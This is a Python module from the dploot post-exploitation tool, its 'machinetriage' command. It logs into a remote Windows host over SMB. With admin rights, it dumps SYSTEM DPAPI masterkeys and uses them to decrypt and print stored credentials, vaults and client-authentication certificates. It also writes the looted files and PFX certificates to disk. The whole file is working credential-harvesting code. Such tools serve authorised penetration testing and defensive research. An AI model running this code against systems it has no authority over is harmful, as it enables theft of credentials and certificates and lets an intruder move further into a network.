import argparse
import logging
import os
import sys
from typing import Callable, Tuple

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import handle_outputdir_option
from dploot.triage.certificates import CertificatesTriage
from dploot.triage.credentials import CredentialsTriage
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
from dploot.triage.vaults import VaultsTriage

NAME = 'machinetriage'

class MachineTriageAction:

    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options
        self.target = Target.from_options(options)
        
        self.conn = None
        self._is_admin = None
        self.outputdir = None
        self.masterkeys = None
        self.pvkbytes = None

        self.outputdir = handle_outputdir_option(dir= self.options.export_triage)
        if self.outputdir is not None:
            for tmp in ['certificates', 'credentials', 'vaults', 'masterkeys']:
                os.makedirs(os.path.join(self.outputdir, tmp), 0o744, exist_ok=True)

        if self.options.mkfile is not None:
            try:
                self.masterkeys = parse_masterkey_file(self.options.mkfile)
            except Exception as e:
                logging.error(str(e))
                sys.exit(1)

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        if self.conn.connect() is None:
            logging.error("Could not connect to %s" % self.target.address)
            sys.exit(1)

    def run(self) -> None:
        self.connect()
        logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
        
        if self.is_admin:
            if self.masterkeys is None:

                def masterkey_callback(masterkey):
                    masterkey.dump()

                masterkeys_triage = MasterkeysTriage(target=self.target, conn=self.conn, per_masterkey_callback=masterkey_callback)
                logging.info("Triage SYSTEM masterkeys\n")
                self.masterkeys = masterkeys_triage.triage_system_masterkeys()
                print()
                if self.outputdir is not None:
                        for filename, bytes in masterkeys_triage.looted_files.items():
                            with open(os.path.join(self.outputdir, 'masterkeys', filename),'wb') as outputfile:
                                outputfile.write(bytes)

            def credential_callback(credential):
                if self.options.quiet:
                    credential.dump_quiet()
                else:
                    credential.dump()

            credentials_triage = CredentialsTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys, per_credential_callback=credential_callback)
            logging.info('Triage SYSTEM Credentials\n')
            credentials_triage.triage_system_credentials()
            if self.outputdir is not None:
                for filename, bytes in credentials_triage.looted_files.items():
                    with open(os.path.join(self.outputdir, filename),'wb') as outputfile:
                        outputfile.write(bytes)

            vaults_triage = VaultsTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys, per_vault_callback=credential_callback)
            logging.info('Triage SYSTEM Vaults\n')
            vaults_triage.triage_system_vaults()
            if self.outputdir is not None:
                for filename, bytes in vaults_triage.looted_files.items():
                    with open(os.path.join(self.outputdir, filename),'wb') as outputfile:
                        outputfile.write(bytes)

            def certificate_callback(certificate):
                if not self.options.dump_all and not certificate.clientauth:
                    return
                if not self.options.quiet:
                    certificate.dump()
                filename = "%s_%s.pfx" % (certificate.username,certificate.filename[:16])
                logging.critical("Writting certificate to %s" % filename)
                with open(filename, "wb") as f:
                    f.write(certificate.pfx)

            certificate_triage = CertificatesTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys, per_certificate_callback=certificate_callback)
            logging.info('Triage SYSTEM Certificates\n')
            certificate_triage.triage_system_certificates()
            if self.outputdir is not None:
                for filename, bytes in certificate_triage.looted_files.items():
                    with open(os.path.join(self.outputdir, filename),'wb') as outputfile:
                        outputfile.write(bytes)
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

def entry(options: argparse.Namespace) -> None:
    a = MachineTriageAction(options)
    a.run()

def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:

    subparser = subparsers.add_parser(NAME, help="Loot SYSTEM Masterkeys (if not set), SYSTEM credentials, SYSTEM certificates and SYSTEM vaults from remote target")

    group = subparser.add_argument_group("machinetriage options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=(
            "File containing {GUID}:SHA1 masterkeys mappings"
        ),
    )

    group.add_argument(
        "-dump-all",
        action="store_true",
        help=(
            "Dump also certificates not used for client authentication"
        )
    )

    group.add_argument(
        "-export-triage",
        action="store",
        metavar="DIR_TRIAGE",
        help=(
            "Dump looted blob to specified directory, regardless they were decrypted"
        )
    )

    add_target_argument_group(subparser)

    return NAME, entry